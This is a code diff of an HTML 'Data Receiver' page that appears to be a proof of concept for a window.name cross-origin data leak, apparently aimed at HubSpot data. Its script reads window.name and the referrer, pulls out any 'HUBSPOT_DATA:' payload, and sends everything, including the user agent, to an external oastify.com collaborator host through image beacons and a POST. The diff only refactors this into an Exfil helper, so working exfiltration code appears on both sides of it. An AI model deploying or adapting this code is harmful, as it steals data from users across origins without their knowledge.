@@ -4,47 +4,39 @@
 <body>
 <h1>Data Receiver</h1>
 <div id="data" style="word-wrap:break-word;max-width:800px;"></div>
+<script src="shared/exfil.js"></script>
 <script>
-const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
+var exfil = Exfil.create('https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com');
 
-// Read window.name
-const name = window.name;
-const ref = document.referrer;
+var name = window.name;
+var ref = document.referrer;
 
 document.getElementById('data').innerHTML = 
     '<strong>Window Name:</strong> ' + (name || '(empty)') + '<br><br>' +
     '<strong>Referrer:</strong> ' + (ref || '(none)') + '<br><br>' +
     '<strong>Length:</strong> ' + name.length + ' chars';
 
-// Exfiltrate
-new Image().src = EXFIL + '/?name=' + encodeURIComponent(name);
-new Image().src = EXFIL + '/?ref=' + encodeURIComponent(ref);
-new Image().src = EXFIL + '/?len=' + name.length;
+exfil.beacon('name', name);
+exfil.beacon('ref', ref);
+exfil.beacon('len', String(name.length));
 
-// If data starts with "HUBSPOT_DATA:", extract it
 if (name.startsWith('HUBSPOT_DATA:')) {
-    const extracted = name.substring(13);
-    new Image().src = EXFIL + '/?extracted=' + encodeURIComponent(extracted);
+    var extracted = name.substring(13);
+    exfil.beacon('extracted', extracted);
     
-    // Try to parse as JSON
     try {
-        const parsed = JSON.parse(extracted);
-        new Image().src = EXFIL + '/?parsed=success&keys=' + Object.keys(parsed).join(',');
+        var parsed = JSON.parse(extracted);
+        exfil.beacon('parsed', 'success&keys=' + Object.keys(parsed).join(','));
     } catch(e) {
-        new Image().src = EXFIL + '/?parsed=failed';
+        exfil.beacon('parsed', 'failed');
     }
 }
 
-// Send full POST
-fetch(EXFIL + '/data', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: JSON.stringify({
-        name: name,
-        referrer: ref,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent
-    })
+exfil.post('/data', {
+    name: name,
+    referrer: ref,
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent
 });
 </script>
 </body>
